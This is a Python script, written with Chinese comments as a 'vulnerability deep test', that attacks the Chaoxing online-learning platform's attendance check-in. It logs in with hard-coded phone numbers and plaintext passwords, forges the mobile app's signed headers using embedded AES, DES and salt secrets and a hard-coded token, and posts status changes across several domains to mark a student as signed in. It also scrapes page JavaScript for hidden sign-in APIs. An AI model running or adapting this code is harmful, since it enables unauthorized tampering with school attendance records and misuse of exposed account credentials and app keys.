import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def inf_enc_sign(params, order=None):
    if order is None:
        order = sorted(params.keys())
    s = "&".join(f"{k}={params[k]}" for k in order if k in params) + f"&DESKey={DES_KEY}"
    return hashlib.md5(s.encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:600]})
    vuln = "修改成功" in detail or "success" in evidence.lower()[:100]
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:150]}")

def run():
    print("=" * 80)
    print(f"签到状态修改漏洞深入测试 - 多域名/多方法绕过")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    test_aid = "5000163767353"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n" + "=" * 80)
    print("[2] 不同域名测试updateSignStatus")
    print("=" * 80)

    domains = [
        "https://mobilelearn.chaoxing.com",
        "https://mooc1-api.chaoxing.com",
        "https://mooc1.chaoxing.com",
        "https://api.chaoxing.com",
        "https://chaoxing.com",
    ]

    for domain in domains:
        try:
            r = s_s.post(f"{domain}/pptSign/updateSignStatus",
                         data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                               "uid": puid_s, "studentId": puid_s, "status": "1"},
                         headers=ajax_hdr, timeout=15)
            rec(f"T2-{domain.split('//')[1].split('.')[0]}", f"学生 {domain}: HTTP {r.status_code}, {r.text[:80]}", r.text[:200])
        except Exception as e:
            rec(f"T2-{domain.split('//')[1].split('.')[0]}", f"学生 {domain}: ERROR {e}")

        try:
            r = s_t.post(f"{domain}/pptSign/updateSignStatus",
                         data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                               "uid": puid_t, "studentId": puid_s, "status": "1"},
                         headers=ajax_hdr, timeout=15)
            rec(f"T2-{domain.split('//')[1].split('.')[0]}-t", f"教师 {domain}: HTTP {r.status_code}, {r.text[:80]}", r.text[:200])
        except Exception as e:
            rec(f"T2-{domain.split('//')[1].split('.')[0]}-t", f"教师 {domain}: ERROR {e}")

    print("\n" + "=" * 80)
    print("[3] 使用K6 Token/inf_enc签名构造请求")
    print("=" * 80)

    params_for_enc = {
        "activeId": test_aid,
        "classId": CLASS_ID,
        "courseId": COURSE_ID,
        "uid": puid_s,
        "studentId": puid_s,
        "status": "1",
    }
    enc_sign = inf_enc_sign(params_for_enc)

    r = s_s.post("https://mobilelearn.chaoxing.com/pptSign/updateSignStatus",
                 data={**params_for_enc, "inf_enc": enc_sign, "_token": HARDCODED_TOKEN},
                 headers=ajax_hdr, timeout=20)
    rec("T3-01", f"学生+inf_enc+K6 Token: {r.text[:100]}", r.text[:300])

    r = s_s.post("https://mobilelearn.chaoxing.com/pptSign/updateSignStatus",
                 data={**params_for_enc, "_token": HARDCODED_TOKEN},
                 headers=ajax_hdr, timeout=20)
    rec("T3-02", f"学生+K6 Token: {r.text[:100]}", r.text[:300])

    r = s_s.post("https://mooc1-api.chaoxing.com/pptSign/updateSignStatus",
                 data={**params_for_enc, "inf_enc": enc_sign, "_token": HARDCODED_TOKEN},
                 headers=ajax_hdr, timeout=20)
    rec("T3-03", f"学生+inf_enc+K6 Token(mooc1-api): HTTP {r.status_code}, {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[4] 教师管理页面API探索")
    print("=" * 80)

    teacher_apis = [
        ("GET", f"https://mooc1.chaoxing.com/mycourse/teacherindex",
         {"courseid": COURSE_ID, "clazzid": CLASS_ID, "cpi": "520211407"},
         "教师管理页面"),
        ("GET", f"https://mooc1.chaoxing.com/mycourse/stuindex",
         {"courseid": COURSE_ID, "clazzid": CLASS_ID, "cpi": "520211407"},
         "学生课程页面"),
        ("GET", f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t},
         "教师活动列表"),
        ("POST", f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
         {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t},
         "教师活动列表POST"),
    ]

    for method, url, params, desc in teacher_apis:
        try:
            if method == "GET":
                r = s_t.get(url, params=params, timeout=20, allow_redirects=False)
            else:
                r = s_t.post(url, data=params, headers=ajax_hdr, timeout=20)
            is_html = "<!DOCTYPE" in r.text[:50] or "<html" in r.text[:100].lower()
            rec(f"T4-{desc[:10]}", f"教师 {desc}: HTTP {r.status_code}, len={len(r.text)}, html={is_html}", r.text[:200])
        except Exception as e:
            rec(f"T4-{desc[:10]}", f"教师 {desc}: ERROR {e}")

    print("\n" + "=" * 80)
    print("[5] 签到管理页面JS分析 - 寻找修改签到状态API")
    print("=" * 80)

    r = s_t.get("https://mooc1.chaoxing.com/mycourse/teacherindex",
                 params={"courseid": COURSE_ID, "clazzid": CLASS_ID, "cpi": "520211407"},
                 timeout=20, allow_redirects=True)
    if r.status_code == 200 and len(r.text) > 100:
        api_patterns = re.findall(r'["\']([^"\']*(?:updateSign|modifySign|changeSign|signStatus|signedResult)[^"\']*)["\']', r.text, re.I)
        js_patterns = re.findall(r'src=["\']([^"\']*\.js)["\']', r.text)
        rec("T5-01", f"教师管理页面API: {api_patterns[:10]}, JS: {js_patterns[:5]}", r.text[:500])
    else:
        rec("T5-01", f"教师管理页面: HTTP {r.status_code}, len={len(r.text)}")

    print("\n" + "=" * 80)
    print("[6] 搜索签到结果页面中的API端点")
    print("=" * 80)

    r = s_s.get("https://mobilelearn.chaoxing.com/newsign/preSign",
                 params={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s},
                 timeout=20)
    if r.status_code == 200 and len(r.text) > 100:
        api_patterns = re.findall(r'["\']([^"\']*(?:pptSign|activeAPI|sign)[^"\']*)["\']', r.text, re.I)
        js_patterns = re.findall(r'src=["\']([^"\']*\.js)["\']', r.text)
        ajax_urls = re.findall(r'url:\s*["\']([^"\']+)["\']', r.text)
        post_urls = re.findall(r'\.post\(["\']([^"\']+)["\']', r.text)
        get_urls = re.findall(r'\.get\(["\']([^"\']+)["\']', r.text)
        all_urls = set(api_patterns + ajax_urls + post_urls + get_urls)
        rec("T6-01", f"preSign页面API: {all_urls}", r.text[:500])

        for js_url in js_patterns[:3]:
            if not js_url.startswith("http"):
                js_url = f"https://mobilelearn.chaoxing.com{js_url}" if js_url.startswith("/") else f"https://mobilelearn.chaoxing.com/{js_url}"
            try:
                r_js = s_s.get(js_url, timeout=15)
                if r_js.status_code == 200:
                    js_apis = set(re.findall(r'["\']([^"\']*(?:updateSign|modifySign|changeSign|signStatus|signedResult|pptSign)[^"\']*)["\']', r_js.text, re.I))
                    js_ajax = set(re.findall(r'url:\s*["\']([^"\']+)["\']', r_js.text))
                    js_post = set(re.findall(r'\.post\(["\']([^"\']+)["\']', r_js.text))
                    all_js_urls = js_apis | js_ajax | js_post
                    if all_js_urls:
                        rec(f"T6-JS-{js_url.split('/')[-1][:15]}", f"JS中发现API: {all_js_urls}", str(all_js_urls)[:300])
            except:
                pass
    else:
        rec("T6-01", f"preSign页面: HTTP {r.status_code}, len={len(r.text)}")

    print("\n" + "=" * 80)
    print("[7] 尝试通过Web端签到管理接口修改状态")
    print("=" * 80)

    web_apis = [
        ("POST", "https://mooc1.chaoxing.com/pptSign/updateSignStatus",
         {"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "mooc1-updateSignStatus"),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/pptSign/updateSignStatus",
         {"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "mooc1-api-updateSignStatus"),
        ("POST", "https://mooc1.chaoxing.com/ppt/activeAPI/modifySignResult",
         {"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "mooc1-modifySignResult"),
        ("POST", "https://mooc1-api.chaoxing.com/mooc-ans/ppt/activeAPI/modifySignResult",
         {"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_s, "studentId": puid_s, "status": "1"},
         "mooc1-api-modifySignResult"),
    ]

    for method, url, data, desc in web_apis:
        try:
            r = s_s.post(url, data=data, headers=ajax_hdr, timeout=15)
            rec(f"T7-{desc[:20]}", f"学生 {url[:50]}: HTTP {r.status_code}, {r.text[:80]}", r.text[:200])
        except Exception as e:
            rec(f"T7-{desc[:20]}", f"ERROR: {e}")

        try:
            r = s_t.post(url, data={**data, "uid": puid_t}, headers=ajax_hdr, timeout=15)
            rec(f"T7-{desc[:20]}-t", f"教师 {url[:50]}: HTTP {r.status_code}, {r.text[:80]}", r.text[:200])
        except Exception as e:
            rec(f"T7-{desc[:20]}-t", f"ERROR: {e}")

    print("\n" + "=" * 80)
    print("[8] 尝试直接修改签到记录（通过签到结果ID）")
    print("=" * 80)

    r = s_s.get("https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"][:3]:
            aid = str(item.get("id", ""))
            sign_url = item.get("url", "")
            rec(f"T8-url-{aid}", f"签到URL: {sign_url[:200]}")

            r = s_s.get(f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax",
                        params={"activeId": aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                                "longitude": "-1", "appType": "15", "fid": "0", "signStatus": "1"},
                        timeout=20)
            rec(f"T8-stuSign-{aid}", f"stuSignajax+signStatus=1: {r.text[:100]}", r.text[:200])

    print("\n" + "=" * 80)
    print("[9] 尝试通过p_auth_token访问")
    print("=" * 80)

    r = s_s.get("https://i.chaoxing.com/base", timeout=20)
    p_auth = ""
    for c in s_s.cookies:
        if c.name == "p_auth_token":
            p_auth = c.value
    rec("T9-01", f"学生p_auth_token: {p_auth[:50] if p_auth else '不存在'}")

    if p_auth:
        r = s_s.post("https://mobilelearn.chaoxing.com/pptSign/updateSignStatus",
                     data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s, "studentId": puid_s, "status": "1", "p_auth_token": p_auth},
                     headers=ajax_hdr, timeout=20)
        rec("T9-02", f"学生+p_auth_token: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[10] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "deep_sign_multi_domain_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success_count = sum(1 for r in results if "修改成功" in r.get("detail", "") or "修改成功" in r.get("evidence", ""))
    fail_count = sum(1 for r in results if "修改失败" in r.get("detail", "") or "修改失败" in r.get("evidence", ""))
    perm_count = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  修改成功: {success_count}, 修改失败: {fail_count}, 无权限: {perm_count}")

if __name__ == "__main__":
    run()
